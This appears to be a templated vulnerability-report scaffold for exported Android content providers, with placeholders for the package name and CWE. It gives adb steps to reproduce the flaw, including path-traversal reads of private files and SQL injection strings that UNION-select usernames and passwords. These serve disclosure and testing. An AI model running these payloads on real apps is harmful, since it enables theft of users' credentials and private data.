## Description
{{ description }}

## Prerequisites
- Rooted Android device or emulator with ADB access
- Target app (`{{ package_name }}`) installed
- `adb` command-line tool

## Steps to Reproduce

### 1. Identify the Content Provider
```bash
# List exported content providers
adb shell dumpsys package {{ package_name }} | grep -A 5 "ContentProvider"
```

### 2. Query the Content Provider
```bash
# Attempt to query the provider URI
adb shell content query --uri content://{{ package_name }}.provider/

# Try common path variations
adb shell content query --uri content://{{ class_name }}/
```

{% if "CWE-22" in cwe %}
### 3. Test Path Traversal
```bash
# Attempt directory traversal
adb shell content read --uri "content://{{ class_name }}/../../../etc/hosts"
adb shell content read --uri "content://{{ class_name }}/..%2F..%2F..%2Fetc%2Fhosts"

# Try to access app private data
adb shell content read --uri "content://{{ class_name }}/../shared_prefs/preferences.xml"
```
{% endif %}

{% if "CWE-89" in cwe %}
### 3. Test SQL Injection
```bash
# Basic SQL injection test
adb shell content query --uri "content://{{ class_name }}/" --where "1=1 OR 1=1"

# Union-based extraction
adb shell content query --uri "content://{{ class_name }}/" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"

# Attempt to read other tables
adb shell content query --uri "content://{{ class_name }}/" --where "1=1) UNION SELECT username,password,3 FROM users--"
```
{% endif %}

### 4. Verify with Frida (Optional)
```bash
# Hook the content provider's query/openFile method to observe behavior
frida -U -f {{ package_name }} -l content_provider_hook.js --no-pause
```

## Expected Result
- The content provider should return data or file access without proper authorization checks
- Path traversal should allow reading files outside the intended directory
- SQL injection should return data from other tables or database metadata

## Impact
{% if "CWE-22" in cwe %}
An attacker app on the same device can read arbitrary files from the target app's private storage, including databases, shared preferences, and authentication tokens.
{% elif "CWE-89" in cwe %}
An attacker can extract sensitive data from the app's database, including user credentials, session tokens, and personal information.
{% else %}
Unauthorized access to the app's content provider allows data exfiltration without user consent.
{% endif %}

